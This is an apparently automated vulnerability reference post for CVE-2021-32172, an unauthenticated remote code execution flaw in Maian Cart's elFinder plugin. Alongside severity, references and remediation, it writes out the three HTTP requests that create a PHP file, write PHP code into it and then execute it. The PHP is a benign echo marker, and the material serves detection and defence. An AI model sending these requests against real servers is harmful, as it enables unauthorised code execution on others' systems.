---
layout: post
cve_id: CVE-2021-32172
title: Maian Cart <=3.8 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2021/CVE-2021-32172.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-32172.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pdteam
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary code on the affected system.

  '
remediation: 'Upgrade to a patched version of Maian Cart (>=3.8) to mitigate this
  vulnerability.

  '
reference:
- https://dreyand.github.io/maian-cart-rce/
- https://github.com/DreyAnd/maian-cart-rce
- https://www.maianscriptworld.co.uk/critical-updates
- https://nvd.nist.gov/vuln/detail/CVE-2021-32172
- https://www.maianscriptworld.co.uk/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-32172
  cwe-id: CWE-862
  epss-score: 0.70441
  epss-percentile: 0.98634
  cpe: cpe:2.3:a:maianscriptworld:maian_cart:3.8:*:*:*:*:*:*:*
metadata:
  max-request: 3
  vendor: maianscriptworld
  product: maian_cart
tags:
- cve2021
- cve
- rce
- unauth
- maian
- intrusive
- maianscriptworld
- vkev
- vuln
---

## üîç Vulnerability Description
Maian Cart 3.0 to 3.8 via the elFinder file manager plugin contains a remote code execution vulnerability.

## üåê HTTP Request
```nohighlight
GET /admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name=38FKfmX4hZt3A9xhUiXt7ypzYnc.php&target=l1_Lw HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Connection: close
Accept: */*
Accept-Encoding: gzip
```

```nohighlight
POST /admin/index.php?p=ajax-ops&op=elfinder HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Connection: close
Content-Length: 94
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip

cmd=put&target=eStdzF&content=%3c%3fphp%20echo%20%2238FKfpuhSyAplzuQxiu0mESAdcZ%22%3b%20%3f%3e
```

```nohighlight
GET /product-downloads/38FKfmX4hZt3A9xhUiXt7ypzYnc.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Connection: close
Accept: */*
Accept-Encoding: gzip
```

